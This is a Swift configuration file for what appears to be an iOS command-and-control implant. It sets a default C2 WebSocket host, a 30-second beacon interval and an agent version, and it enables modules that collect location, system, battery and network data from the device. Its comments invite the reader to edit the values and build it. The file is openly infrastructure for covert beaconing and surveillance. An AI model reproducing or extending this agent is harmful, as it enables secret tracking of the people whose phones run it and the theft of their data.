import Foundation

enum Config {
    // ── C2 connection ──────────────────────────────────────────────────────────
    // Edit these values before building, or inject via build settings.
    static let c2WebSocketURL = ProcessInfo.processInfo.environment["C2_WS_URL"]
        ?? "wss://c2.bixtx.com:3001"
    static let beaconInterval: TimeInterval = Double(
        ProcessInfo.processInfo.environment["BEACON_INTERVAL"] ?? "30"
    ) ?? 30

    // ── Agent identity ─────────────────────────────────────────────────────────
    static let agentVersion = "4.7.2"
    static let platform     = "ios"

    // ── Feature flags (set false to disable module at compile time) ────────────
    static let enableLocation     = true
    static let enableSystemInfo   = true
    static let enableBattery      = true
    static let enableNetworkInfo  = true
}
